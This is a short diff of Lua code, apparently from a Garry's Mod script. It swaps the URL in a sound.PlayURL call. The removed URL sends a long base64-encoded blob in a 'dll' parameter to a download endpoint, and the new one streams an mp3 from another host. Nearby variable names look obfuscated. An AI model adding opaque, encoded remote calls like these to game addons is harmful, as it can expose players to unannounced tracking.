@@ -204,7 +204,7 @@ end)
 SOUNDSTART_CTP = false 
 OZJFOZJCEZIO = true 
 
-sound.PlayURL("https://files.kpanel.cz/download.php?dll=|MUV5dnRkOTBmWE5TdmFRVmtIN1JBS3NVVzcrT3FxOHF5WU1qdFB5cGMxSXFsUTQyaUdQalFOVmswMGsvbk9HVFYraUhXR1dPZGp1bHZmektXNVVWVDlZMFRMTFRoZ0tYMzJ4RFFCS1pYTm5sN2VRM1RscU1la3VMN1RJNmxidUZtUEJpRDdQWWt4cG5LTmVlYi9yNERGWVRaSDF6dXcrVjZ6Z3pEbndWSDBVPQ==|wantmedead.mp3|","mono noblock noplay",function(s) 
+sound.PlayURL("https://dragontechcommunity.cf/wantmedead.mp3","mono noblock noplay",function(s) 
 	if not s then return end 
 	if SOUNDSTART_CTP then s:Stop() return end 
 	SOUNDSTART_CTP = true 
